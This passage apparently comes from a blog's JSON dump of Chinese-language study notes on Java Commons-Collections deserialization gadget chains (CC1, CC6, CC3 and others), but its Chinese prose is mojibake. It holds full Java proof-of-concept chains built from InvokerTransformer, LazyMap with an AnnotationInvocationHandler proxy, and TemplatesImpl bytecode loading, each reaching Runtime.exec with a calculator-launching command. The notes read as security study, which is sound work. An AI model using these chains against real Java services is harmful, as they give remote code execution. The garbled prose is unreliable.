é“¾å­çš„è¿‡ç¨‹ä¸­ä¸€èˆ¬æ˜¯å€’ç€æ¥çœ‹æ„Ÿè§‰ä¼šæ¯”è¾ƒé¡ºä¸€ç‚¹ï¼Œæ‰€ä»¥æˆ‘ä»¬ä»InvokeTransformæ¥çœ‹ï¼šåœ¨InvokeTransformä¸­transformæ–¹æ³•ä¸­å®ç°äº†getMethodå’Œinvokeæ–¹æ³•ï¼Œåˆšå¥½å¯ä»¥å°†æˆ‘ä»¬çš„Runtime.exeé‚£ä¸€æ®µè¿›è¡Œå‘½ä»¤æ‰§è¡Œè¿™é‡Œç”¨äº†ä¸€ä¸ªchainedTransformæ•°ç»„è¿›è¡Œä¸€ä¸ªæ•´ä½“çš„transformèµ·åˆ°ç®€åŒ–ä»£ç çš„ä½œç”¨ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬åªéœ€è¦å¯»æ‰¾å“ªé‡Œè°ƒç”¨äº†transformå°±å¯ä»¥ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œåœ¨LazyMapä¸­çš„getæ–¹æ³•ä¸­è°ƒç”¨äº†transformï¼Œæ¥ä¸‹æ¥å…³æ³¨ä¸€ä¸‹è¿™factoryæ˜¯å¦‚ä½•ä¼ å…¥çš„ï¼Œå¯ä»¥å‘ç°ï¼Œè¿™è¾¹æ˜¯LazyMapçš„æ„é€ æ–¹æ³•ï¼Œç”±äºæ˜¯protectedï¼Œè¿˜éœ€è¦ä½¿ç”¨åå°„çš„æ–¹å¼æ¥è¿›è¡Œèµ‹å€¼ä½†æ˜¯å†å¾€ä¸‹çœ‹ï¼Œå‘ç°å…¶decorateæ–¹æ³•ä¼šç›´æ¥è¿”å›ä¸€ä¸ªLazyMapå¯¹è±¡ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥è°ƒç”¨è¿™ä¸ªæ–¹æ³•è¿›è¡Œèµ‹å€¼å°±è¡Œäº†å…·ä½“èµ‹å€¼æ–¹å¼å¦‚ä¸‹ï¼šæ¥ä¸‹æ¥æˆ‘ä»¬è¦çœ‹ä¸€ä¸‹å“ªé‡Œè°ƒç”¨äº†è¿™ä¸ªgetï¼Œåœ¨annotationinvocationhandlerçš„invokeæ–¹æ³•ä¸­å°±è°ƒç”¨äº†è¿™ä¸ªgetï¼Œä½†æ˜¯éœ€è¦æ€è€ƒçš„æ˜¯ï¼Œå¦‚ä½•è§¦å‘è¿™ä¸ªinvokeæ–¹æ³•ï¼Œè¿™é‡Œæˆ‘ä»¬å›æƒ³ä¸€ä¸‹phpé‡Œé¢çš„__callæ–¹æ³•ï¼Œé€šè¿‡è°ƒç”¨ä¸å­˜åœ¨çš„æ–¹æ³•ï¼Œå°±ä¼šè°ƒç”¨åˆ°invokeæ–¹æ³•ä¸­ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥æˆ‘ä»¬å°±åªéœ€è¦å¯»æ‰¾ç¬¦åˆæ¡ä»¶çš„å³å¯è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬è¦ä½¿ç”¨æ— å‚çš„æ–¹æ³•ï¼Œæ­£å¥½åœ¨readObjectä¸­å°±æœ‰ä¸€ä¸ªç¬¦åˆæ¡ä»¶çš„ï¼Œä½†æ˜¯è¦åœ¨å…¶ä»–ç±»çš„å†…éƒ¨è¿›è¡Œè¿™æ“ä½œï¼Œæˆ‘ä»¬éœ€è¦å€ŸåŠ©ä»£ç†å› æ­¤èµ‹å€¼æ–¹å¼å¦‚ä¸‹ï¼šé¦–å…ˆå…³æ³¨ä¸€ä¸‹å…¶æ„é€ æ–¹æ³•ï¼Œéœ€è¦ä¼ å…¥çš„ç±»å‹ï¼Œç›´æ¥ä¼ å…¥çš„è¯å°±ä¼šå¯¹æˆ‘ä»¬éœ€è¦çš„memberValueèµ‹å€¼äº† //åå°„è°ƒç”¨AnnotationInvocationHandlerç±» Class&lt;?&gt; b= Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);//è·å–å…¶æ„é€ æ–¹æ³• Constructor annotationInvocationhdlconstructor=b.getDeclaredConstructor(Class.class, Map.class); annotationInvocationhdlconstructor.setAccessible(true);//å®ä¾‹åŒ–å¯¹è±¡å¹¶è¿›è¡Œèµ‹å€¼æ“ä½œ InvocationHandler handler = (InvocationHandler) annotationInvocationhdlconstructor.newInstance(Override.class,Lazymap);//å®ä¾‹åŒ–ä¸€ä¸ªä»£ç†å¯¹è±¡ Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class},handler);//åœ¨å®ä¾‹åŒ–ä¸€ä¸ªannotationInvocationHadnler,é‡Œé¢è£…çš„æ˜¯ä»£ç†çš„å†…å®¹ï¼Œç›¸å½“äºæ˜¯å¥—äº†ä¸€ä¸ªå£³ Object o = annotationInvocationhdlconstructor.newInstance(Override.class,mapProxy); å¦å¤–ä¸€æ¡cc1é“¾æ¯”è¾ƒç®€å•ï¼Œå°±ä¸ç»†è®²äº†ï¼Œ ##CC61.é€‚ç”¨ç‰ˆæœ¬ï¼šæ²¡æœ‰ç‰ˆæœ¬é™åˆ¶åœ¨CC6ä¸­ï¼Œä¸»è¦æ˜¯å‰åŠéƒ¨åˆ†æœ‰åŒºåˆ«ï¼Œåœ¨è°ƒç”¨åˆ°getéƒ¨åˆ†é‡‡ç”¨çš„æ˜¯TiedMapEntry.hashCodeæ–¹æ³•ï¼Œå› ä¸ºåœ¨hashcodeä¸­ä¼šè°ƒç”¨åˆ°getValueæ–¹æ³•å¹¶ä¸”åœ¨getValueä¸­ä¼šè°ƒç”¨åˆ°getæ–¹æ³•è€Œè¿™é‡Œæ˜¯å¯¹mapè¿›è¡Œè°ƒç”¨äº†ï¼Œæˆ‘ä»¬çœ‹çœ‹mapæ˜¯å¦‚ä½•èµ‹å€¼çš„ï¼Œç›´æ¥æ„é€ æ–¹æ³•ç©¿å‚å°±å¯ä»¥äº†æ¥ä¸‹æ¥å°±æ˜¯å¯»æ‰¾å“ªé‡Œæœ‰è°ƒç”¨è¿™ä¸ªhashcodeäº†ï¼Œå¯ä»¥çœ‹åˆ°åœ¨HashMapçš„readObjectä¸­å°±æœ‰è°ƒç”¨é‚£ä¹ˆè§£ææ¥å°±æ¥çœ‹ä¸€ä¸‹ä¸¤å¤„æ˜¯å¦‚ä½•èµ‹å€¼çš„ï¼šTiedMapEntry.hashcodeå°±æ˜¯é‡‡ç”¨ç›´æ¥èµ‹å€¼çš„å½¢å¼å°±å¯ä»¥äº†ï¼Œå› ä¸ºä»–æœ‰è¿™ä¸ªæ„é€ å‡½æ•°æ¥ä¸‹æ¥å°±æ˜¯èµ‹å€¼åˆ°hashmapé‡Œé¢å»ï¼Œå› ä¸ºï¼Œhashmapå…¶å®æ˜¯ä¸€ä¸ªé”®å€¼å¯¹ï¼Œå‰é¢æ˜¯keyï¼Œåé¢æ˜¯valueç„¶åæˆ‘ä»¬æ¥ä¸‹æ¥å°±æ˜¯å¯¹å…¶èµ‹å€¼ï¼Œä½†æ˜¯åœ¨hashmapé‡Œé¢ï¼Œè¦å¯¹å…¶é”®å€¼å¯¹è¿›è¡Œèµ‹å€¼éœ€è¦è°ƒç”¨putå‡½æ•°ï¼Œä½†æ˜¯è¿™è¿˜ä¸å¤Ÿï¼Œç”±äºåœ¨putçš„æ—¶å€™å°±æœ‰hashäº†ä¹Ÿå°±æ˜¯è¿™é‡Œç„¶åæ¥ä¸‹æ¥ä»–å°±ä¼šèµ°ä¸€éæˆ‘ä»¬ä¹‹å‰çš„é“¾å­äº†ï¼Œé‚£ä¹ˆè¿™æ ·ä¼šé€ æˆä»€ä¹ˆåæœå‘¢æˆ‘ä»¬å¾€ä¸‹ç»§ç»­çœ‹ä¸€ä¸‹ï¼Œåœ¨ååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­ï¼Œæ­¤æ—¶ç”±äºæˆ‘ä»¬å‰é¢putè¿‡ä¸€æ¬¡äº†ï¼Œæ‰€ä»¥æ­¤æ—¶å°±containsé‚£ä¸ªkeyï¼Œé‚£ä¹ˆå°±è¿›ä¸åˆ°è¿™ä¸ªtransformé‡Œé¢ï¼Œå› æ­¤æˆ‘ä»¬è¿™æ¡é“¾å°±æ–­äº†æ‰€ä»¥æ­¤æ—¶ï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦å°†è¿™ä¸ªaç»™removeæ‰ï¼Œåœ¨ååºåˆ—åŒ–çš„æ—¶å€™æ‰èƒ½è¿›å…¥okï¼Œåˆ°è¿™é‡Œæˆ‘ä»¬æ‹ä¸€ä¸‹ ç”±äºåœ¨å¯¹map2è¿›è¡Œputçš„èµ‹å€¼æ“ä½œçš„æ—¶å€™ï¼Œèµ°åˆ°äº†getæ–¹æ³•ï¼Œæ­¤æ—¶è¯´getæ–¹æ³•å°±ä¼šåˆ¤æ–­æ˜¯å¦è¿˜æœ‰keyï¼Œå› ä¸ºæ˜¯ç¬¬ä¸€æ¬¡èµ°åˆ°è¿™é‡Œï¼Œæ‰€ä»¥è‚¯å®šæ˜¯æ²¡æœ‰è¿™ä¸ªkeyçš„ï¼Œé‚£ä¹ˆå°±è¿›å…¥åˆ°transformä¸­ï¼Œå¹¶ä¸”è¿›è¡Œäº†ä¸€ä¸ªputçš„æ“ä½œï¼Œæ­¤æ—¶è¿™ä¸ªhashmapå°±æœ‰äº†è¿™ä¸ªkeyäº† é’ˆå¯¹ä»¥ä¸Šé—®é¢˜ï¼Œæˆ‘ä»¬é¦–å…ˆè¦åœ¨putä»¥åå°†è¿™ä¸ªkeyç»™åˆ æ‰ï¼Œä¹Ÿå°±æ˜¯ä½¿ç”¨ä¸Šé¢çš„removeæ“ä½œæ¥ä¸‹æ¥æ˜¯ç¬¬äºŒä¸ªé—®é¢˜ï¼Œå¦‚ä½•è§£å†³åºåˆ—åŒ–è¿‡ç¨‹å°±å‘½ä»¤æ‰§è¡Œè¿™ä¸€é—®é¢˜ï¼Œé‚£ä¹ˆå°±æ˜¯åœ¨ä¸€å¼€å§‹çš„å…ˆèµ‹å€¼ä¸€ä¸ªä¸å­˜åœ¨å‘½ä»¤æ‰§è¡Œæ•ˆæœçš„ç„¶åå†åˆ©ç”¨åå°„æ›´æ”¹å€¼ ##cc31.invoketransformè¢«è¿‡æ»¤ã€éœ€è¦è°ƒç”¨å­—èŠ‚ç 2.ä»£ç æ‰§è¡Œâ€”ï¼ˆåŠ¨æ€ç±»åŠ è½½ï¼‰æˆ‘ä»¬è¦ä½¿ç”¨defineclassè°ƒç”¨å­—èŠ‚ç å®ç°åŠ¨æ€ç±»åŠ è½½ä»¥è¾¾åˆ°å‘½ä»¤æ‰§è¡Œçš„ç›®çš„ï¼Œé‚£ä¹ˆå°±éœ€è¦æ‰¾åˆ°ä¸€å¤„æœ‰è°ƒç”¨newinstanceçš„é¦–å…ˆï¼Œæˆ‘ä»¬æ‰¾åˆ°çš„æ˜¯TemplatesImpl.newTransformeré‡Œé¢æœ‰ä¸€ä¸ªgetTransletInstanceåœ¨è¿™é‡Œé¢å°±æœ‰ä¸€ä¸ªnewInstanceè€Œè¿™ä¸ªnewInstanceå‰é¢è°ƒç”¨çš„å†…å®¹ï¼Œæ¥æºäºä¸Šé¢è¿™ä¸ªå‡½æ•°å¯ä»¥å‘ç°è¿™é‡Œå°±å®ç°äº†ä½¿ç”¨defineclasså¯¹_class[i]çš„èµ‹å€¼é¦–å…ˆæˆ‘ä»¬æ¥çœ‹è¿™ä¸€éƒ¨åˆ†å¦‚ä½•èµ‹å€¼ï¼šåœ¨ä¸Šé¢çš„ä»£ç ä¸­ï¼Œæˆ‘ä»¬å‘ç°ï¼Œè¦åˆ°newInstanceçš„ä½ç½®ï¼Œéœ€è¦å¯¹__name å’Œ__bytecodesï¼ˆä¼ å…¥çš„å­—èŠ‚ç ï¼‰è¿›è¡Œèµ‹å€¼çœ‹çœ‹æ„é€ å‡½æ•°ï¼Œå‘ç°æ˜¯æ— å‚çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥åˆ©ç”¨åå°„æ¥æ›´æ”¹å€¼å°±è¡Œæ ¹æ®å‰é¢çš„åˆ†æï¼Œæˆ‘ä»¬è¿›è¡Œäº†ä¸€ä¸‹çš„èµ‹å€¼ä½†æ˜¯æ­¤æ—¶è¿˜æ˜¯æ— æ³•æˆåŠŸå‘½ä»¤æ‰§è¡Œå› ä¸ºåœ¨defineclassä¸­ï¼Œå¦‚æœæ²¡æœ‰æ»¡è¶³çˆ¶ç±»æ˜¯ABSTRACT_TRANSLETåˆ™ä¼šæŠ¥é”™å› æ­¤ï¼Œæˆ‘ä»¬åœ¨å‰é¢äº›å­—èŠ‚ç çš„ç±»ä¸­ï¼Œè¿˜éœ€è¦åŠ ä¸Šä¸‹é¢çš„extendsæ­¤æ—¶æ‰å¯ä»¥æˆåŠŸæ‰§è¡Œè€Œè¿™éƒ¨åˆ†å†…å®¹ï¼Œå…¶å®æ˜¯æˆ‘ä»¬ä¸ºäº†åœ¨åºåˆ—åŒ–çš„æ—¶å€™æµ‹è¯•èƒ½å¦æˆåŠŸå‘½ä»¤æ‰§è¡Œè€ŒåŠ ä¸Šå»çš„è¿™ä¸ª_tfactoryçš„å±æ€§æ˜¯transientï¼Œæ˜¯æ— æ³•è¢«åºåˆ—åŒ–çš„ï¼Œä½†æ˜¯åœ¨readObjectä¸­ä¼šè‡ªåŠ¨èµ‹å€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¸ç”¨ç®¡å‰é¢çš„éƒ¨åˆ†è¿›è¡Œtransformæ–¹æ³•ä»¥åå°±å¯ä»¥å®ç°å‘½ä»¤æ‰§è¡Œäº†ï¼Œæ¥ä¸‹æ¥å°±åªéœ€è¦å°†åé¢çš„æ–¹æ³•å®Œå–„å¥½å°±è¡Œï¼Œå¦‚æœinvoketansformè¿˜èƒ½ç”¨çš„è¯ï¼Œç›´æ¥è¿›è¡Œä»¥ä¸‹æ–¹æ³•çš„è°ƒç”¨å³å¯ åœ¨cc3ä¸­ï¼Œå’Œå‰é¢ä¸¤æ¡é“¾å­æœ€å¤§çš„ä¸åŒå°±æ˜¯ååŠæ®µï¼Œå‰é¢æ˜¯é€‚ç”¨invoketransformæ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œçš„è§¦å‘ï¼Œè¿™é‡Œéœ€è¦å¯¹invoketransformè¿›è¡Œä¸€ä¸‹è§£é‡Šï¼Œè¿™ä¸ªç±»ï¼Œé‡Œé¢çš„tansformå®ç°äº†getMethodå’Œinvokeæ–¹æ³•ï¼Œé‚£å°±æ˜¯å¯ä»¥åå°„è°ƒç”¨ä»»æ„çš„æ–¹æ³•å¹¶æ‰§è¡Œï¼Œæ‰€ä»¥å‰é¢æ‰è¯´è°ƒç”¨newTransformerå’ŒtemplatesImpleå°±å‘¼åº”ä¸Šäº†ï¼Œä½†æ˜¯å¦‚æœè¿‡æ»¤äº†invoketransformï¼Œé‚£ä¹ˆæ­¤æ—¶æˆ‘ä»¬å°±è¦å¦å¤–å¯»æ‰¾è°ƒç”¨äº†newTransformerçš„åœ°æ–¹â€”â€”TrAXFilterè¿™ä¸ªç±»è¿˜æœ‰ä¸€ç§æ˜¯åˆ©ç”¨TrAXFilterçš„æ„é€ æ–¹æ³•åœ¨è¿™é‡Œè°ƒç”¨äº†newTransformerï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥å¯¹å…¶æ„é€ å‡½æ•°è¿›è¡Œèµ‹å€¼å°±è¡Œäº†ï¼Œæ¥ä¸‹æ¥å°±æ˜¯æ‰¾å“ªé‡Œæœ‰è§¦å‘è·å–æ„é€ å‡½æ•°çš„ä½ç½®ï¼Œåœ¨InstantiateTransformerçš„transformä¸­ä½¿ç”¨äº†getConstructorè·Ÿè¿›å»å¯ä»¥å‘ç°ï¼Œè¿™é‡Œå°±ä¼šè°ƒç”¨å‰é¢çš„TrAXFilterçš„æ„é€ æ–¹æ³•ï¼Œå¹¶å¯¹å…¶èµ‹å€¼ä¸ºtemplatesImpleæ¥ä¸‹æ¥å°±çœ‹çœ‹å¦‚ä½•å¯¹å…¶è¿›è¡Œèµ‹å€¼,è¿™é‡Œå‚è€ƒä¸€ä¸‹InstantiateTransformerçš„æ„é€ å‡½æ•°ä»¥åŠå‚æ•°å°±å¯ä»¥äº†cc3ä¸»è¦æ˜¯æ¢³ç†è¿™äº›å³å¯ ##cc41.ç‰ˆæœ¬ï¼šcc4 ##cc21.è¿™æ¡ccé“¾æ˜¯æ²¡æœ‰ç”¨åˆ°æ•°ç»„çš„ç„¶åè¿™é‡Œçš„putæˆ‘ä»¬è·Ÿä¸€ä¸‹ï¼Œè¿åŒä¸Šé¢çš„cc4ä¸€èµ·ç†è§£ InvokerTransformer&lt;Object,Object&gt; invokerTransformer = new InvokerTransformer&lt;&gt;(&quot;newTransformer&quot;,new Class[]{},new Object[]{});TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(new ConstantTransformer&lt;&gt;(1));PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator);priorityQueue.add(1);priorityQueue.add(template); é¦–å…ˆsizeè¦å¤§äºç­‰äº2ï¼Œä¸ç„¶æ— æ³•è¿›å…¥åˆ°siftDownï¼Œä¹Ÿå°±æ— æ³•æ‰§è¡Œåç»­çš„é“¾æ¡äº†æ¥ä¸‹æ¥æ˜¯å“ªä¸ªéƒ¨åˆ†æ”¾templateçš„é—®é¢˜ï¼Œå¯ä»¥å‘ç°å¦‚æœæ˜¯ç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯å…¶ä»–å€¼ï¼Œé‚£ä¹ˆå°±ä¼šé€ æˆè¿™é‡Œå‘ç”Ÿé”™è¯¯ï¼Œå› ä¸º1.getClassæ˜æ˜¾æ˜¯æœ‰é—®é¢˜çš„ ##cc5 ##cc7å¾€ä¸Šè°ƒç”¨equalsï¼Œæœ€åè°ƒç”¨åˆ°çˆ¶ç±»çš„ï¼Œç„¶åè½¬åˆ°get c","link":"/2023/01/10/java_cc%E9%93%BE%E5%B0%8F%E7%BB%93/"},{"title":"java-cc3","text":"##æ‰§â¾ä»»æ„å­—èŠ‚ç çš„CommonsCollectionsåˆ©â½¤é“¾ç»“åˆå‰é¢çš„defineClassæ‰§è¡Œå­—èŠ‚ç çš„ä»£ç ###ä½¿ç”¨ new TemplatesImpl() public static void main(String[] args) throws Exception { TemplatesImpl template = new TemplatesImpl(); Class tc = template.getClass(); Field nameField= tc.getDeclaredField(&quot;_name&quot;); nameField.setAccessible(true); nameField.set(template,&quot;aaa&quot;); Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;); bytecodesField.setAccessible(true); byte[] code = Files.readAllBytes(Paths.get(&quot;/Users/tlif3./Desktop/www/java_web/cc1/cc1_1/src/main/java/org/example/runtime.class&quot;)); byte[][] codes = {code}; Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;); tfactoryField.setAccessible(true); tfactoryField.set(template,new TransformerFactoryImpl()); bytecodesField.set(template,codes);// template.newTransformer(); Transformer[] transformers = new Transformer[]{ new ConstantTransformer(template), new InvokerTransformer(&quot;newTransformer&quot;,null,null) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); chainedTransformer.transform(Runtime.class); } ç®€åŒ–ç‰ˆå¦‚ä¸‹ byte[] code =Base64.getDecoder().decode(&quot;&quot;); TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][] {code}); setFieldValue(obj, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;); setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl()); Transformer[] transformers = new Transformer[]{ new ConstantTransformer(obj), new InvokerTransformer(&quot;newTransformer&quot;, null, null) }; Transformer transformerChain = newChainedTransformer(transformers); ##CC3åœ¨cc3ä¸­ï¼Œä¸»è¦æ”¹å˜çš„æ˜¯å‰é¢çš„invokeTransformerçš„è°ƒç”¨ï¼Œå› ä¸ºåœ¨è¿™é‡Œæ˜¯ä¸ºäº†ç»•è¿‡è¿‡æ»¤äº†invokerTransformerä»¥åèƒ½å¤Ÿç»§ç»­å‘½ä»¤æ‰§è¡Œï¼Œæ‰€ä»¥è¿™é‡Œé‡‡ç”¨çš„æ˜¯org.apache.commons.collections.functors.InstantiateTransformerã€‚InstantiateTransformerä¹Ÿæ˜¯â¼€ä¸ªå®ç°äº†Transformeræ¥â¼çš„ç±»ï¼Œä»–çš„ä½œâ½¤å°±æ˜¯è°ƒâ½¤æ„é€ â½…æ³•é‚£ä¹ˆè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±åªéœ€è¦æ‰¾åˆ°ä¸€ä¸ªæ„é€ æ–¹æ³•é‡Œé¢å«æœ‰newTransformerçš„æ–¹æ³•å°±è¡Œï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æ‰§è¡Œå­—èŠ‚ç çš„æ–¹å¼æ¥æ‰§è¡Œå‘½ä»¤äº†ã€‚è€Œè¿™é‡Œä½¿ç”¨çš„ç±»å°±æ˜¯com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter è¿™ä¸ªç±»çš„æ„é€ æ–¹æ³•ä¸­è°ƒç”¨äº†(TransformerImpl)templates.newTransformer(),å› æ­¤æˆ‘ä»¬æ— éœ€ä½¿ç”¨InvokerTransformeræ‰‹å·¥è°ƒç”¨newTransformerè¿™ä¸€æ­¥ Transformer[] transformers = new Transformer[]{ new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer( new Classp[] {Templates.class}, new Object[] {obj} )}; åœ¨è¿™é‡Œå¯ä»¥å‘ç°ï¼Œæœ‰ä¸€ä¸ªtransformï¼Œå¯¹ä¼ å…¥çš„ç±»è¿›è¡Œå®ä¾‹åŒ–äº†ï¼Œç±»ä¼¼äºinvoketransformçš„åŠŸèƒ½","link":"/2023/01/09/javacc3/"},{"title":"java-cc1ã€cc6","text":"#ç¯å¢ƒæ­å»ºopenjdk 8u65ç›¸å…³æºç ä¸‹è½½http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/archive/af660750b2f4.zipè¿™é‡Œç»å¸¸ä¼šä¸‹åˆ°ä¸€åŠæ–­æ‰ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥ä¸‹è½½sunæ–‡ä»¶é‡Œé¢çš„å†…å®¹ï¼Œä¹Ÿæ˜¯ç›´æ¥ç‚¹zipä¸‹è½½å°±è¡Œopenjdk 8u65ä¸‹è½½https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html #è°ƒè¯•cc1##å‘½ä»¤æ‰§è¡Œæ–¹å¼###ä¸€èˆ¬å‘½ä»¤æ‰§è¡Œæ–¹å¼ Runtime.getRuntime().exec(&quot;open /System/Applications/Calculator.app&quot;); ###åˆ©ç”¨åå°„è°ƒç”¨æ‰§è¡Œå‘½ä»¤ Runtime r=Runtime.getRuntime();Class c=Runtime.class;Method execMethod = c.getMethod(&quot;exec&quot;,String.class);execMethod.invoke(r,&quot;open /System/Applications/Calculator.app&quot;); ###transformæ‰§è¡Œå‘½ä»¤ï¼ˆæœ€ç»ˆå‘½ä»¤æ‰§è¡Œå¤„ï¼‰ä½†æ˜¯æ­¤æ—¶æ²¡åŠæ³•ååºåˆ—åŒ–ï¼Œå› ä¸ºRuntimeç±»æ²¡æœ‰ç»§æ‰¿åºåˆ—åŒ–æ¥å£ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±éœ€è¦å¯»æ‰¾å¯ä»¥å®ç°åå°„çš„é€”å¾„ï¼Œè¿™é‡Œå°±å¯ä»¥çœ‹åˆ°ç›¸å½“äºæ˜¯å®ç°äº†ä¸€ä¸ªåå°„æ–¹æ³•ï¼Œè€Œè¿™ä¸ªtransformæ–¹æ³•æ˜¯å±äºInvokerTransformerè¿™ä¸ªæ–¹æ³•çš„ï¼Œè€ŒInvokerTransformeræ˜¯æœ‰ç»§æ‰¿åºåˆ—åŒ–æ¥å£ï¼Œæ‰€ä»¥å°±ç”¨è¿™ä¸ªç±»æ¥æ„é€ ä¸€ä¸‹å‘½ä»¤æ‰§è¡Œå§¿åŠ¿ public static void main(String[] args) throws Exception { Method getRuntimeMethod = (Method) new InvokerTransformer(&quot;getMethod&quot;,new Class[]{String.class,Class[].class},new Object[]{&quot;getRuntime&quot;,null}).transform(Runtime.class); Runtime r= (Runtime) new InvokerTransformer(&quot;invoke&quot;,new Class[]{Object.class,Object[].class},new Object[]{null,null}).transform(getRuntimeMethod); new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;open /System/Applications/Calculator.app&quot;}).transform(r);} è€Œè¿™æ ·å†™åˆå†™éº»çƒ¦ï¼Œå¯ä»¥ä½¿ç”¨ChainedTransformç›´æ¥é“¾å¼è°ƒç”¨ï¼š Transformer[] transformers = new Transformer[]{ new InvokerTransformer(&quot;getMethod&quot;,new Class[]{String.class,Class[].class},new Object[]{&quot;getRuntime&quot;,null}), new InvokerTransformer(&quot;invoke&quot;,new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;open /System/Applications/Calculator.app&quot;})};ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);chainedTransformer.transform(Runtime.class); é¦–å…ˆè¿™é‡Œçš„InvokerTransformerä¼ å…¥çš„å‚æ•°æ ¼å¼ä¸ºï¼Œç¬¬ä¸€ä¸ªæ˜¯æ–¹æ³•åï¼Œç¬¬äºŒä¸ªæ˜¯æ–¹æ³•åçš„æ•°æ®ç±»å‹ï¼Œç¬¬ä¸‰ä¸ªæ˜¯å‚æ•°ã€‚ ##æ„é€ é“¾æ¡è¦æ„é€ é“¾æ¡ï¼Œé¦–å…ˆéœ€è¦æ‰¾ä¸€ä¸‹å“ªé‡Œè°ƒç”¨äº†transform,åœ¨è¿™äº›mapé‡Œé¢å‡æœ‰è°ƒç”¨transformä»¥checksetvalueä¸ºå‡½æ•°ï¼Œå†æ‰¾ä¸€ä¸‹å“ªé‡Œè°ƒç”¨äº†è¿™ä¸ªchecksetvalueæ¥ä¸‹æ¥éœ€è¦çœ‹çœ‹checksetvalueé‡Œé¢çš„ï¼Œå¯ä»¥çœ‹åˆ°è¿™ä¸ªchecksetvalueæ˜¯å¯¹valuetransformerè¿›è¡Œtransformè¿›è¡Œèµ‹å€¼æ“ä½œï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦çœ‹çœ‹æ„é€ å‡½æ•°å¯¹å¦‚ä½•å¯¹è¿™ä¸ªvaluetransformerè¿›è¡Œèµ‹å€¼ï¼Œç„¶åä»è¿™é‡Œä¼ å…¥ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œæ˜¯è¿™ä¸ªç±»çš„ä¸€ä¸ªæ„é€ å‡½æ•°æ¥ä¸‹æ¥å°±çœ‹çœ‹å“ªé‡Œæœ‰è°ƒç”¨è¿™ä¸ªchecksetvalueï¼Œç„¶ååœ¨è¿›è¡Œæ¢ç´¢å¯ä»¥å‘ç°ï¼Œæ˜¯åœ¨setvalueè¿™è¾¹ä½¿ç”¨ï¼Œæ¥ä¸‹æ¥å°±çœ‹çœ‹å“ªé‡Œè°ƒç”¨äº†è¿™ä¸ªsetvalueå¯ä»¥çœ‹åˆ°ï¼Œåœ¨AnnotationInvocationHandlerä¸­çš„readObjectç›´æ¥ä½¿ç”¨äº†è¿™ä¸ªsetValueï¼Œç„¶åæ¥ä¸‹æ¥æˆ‘ä»¬åªéœ€å…³æ³¨memberValueå¦‚ä½•ä¼ å…¥å³å¯å¯ä»¥çœ‹åˆ°ï¼Œä¼ å…¥çš„ç±»å‹ä¸ºmapç±»å‹å°±è¡Œé‚£æˆ‘ä»¬æ¥ä¸‹æ¥å°±æ‹ä¸€ä¸‹è°ƒç”¨é“¾ï¼šInvocationHandler().transformer-&gt;TransformedMap.transformer -&gt;AbstractMapEntryDecorator.setValue -&gt;AnnotationInvocationHandler.readObjectpoc: public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;,new Class[]{String.class,Class[].class},new Object[]{&quot;getRuntime&quot;,null}), new InvokerTransformer(&quot;invoke&quot;,new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;open /System/Applications/Calculator.app&quot;}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); chainedTransformer.transform(Runtime.class); Class&lt;Runtime&gt; c = Runtime.class;// Method getRuntimeMethod= c.getMethod(&quot;getRuntime&quot;,null);// Runtime r= (Runtime) getRuntimeMethod.invoke(null,null);// Method execMethod = c.getMethod(&quot;exec&quot;,String.class);// execMethod.invoke(r,&quot;open /System/Applications/Calculator.app&quot;); HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;(); map.put(&quot;value&quot;,&quot;bb&quot;); Map&lt;Object,Object&gt; transformedMap =TransformedMap.decorate(map,null,chainedTransformer); Class&lt;?&gt; b= Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor&lt;?&gt; annotationInvocationhdlconstructor=b.getDeclaredConstructor(Class.class, Map.class); annotationInvocationhdlconstructor.setAccessible(true); Object o = annotationInvocationhdlconstructor.newInstance(Target.class,transformedMap); serialize(o); unserialize(&quot;ser.bin&quot;); } 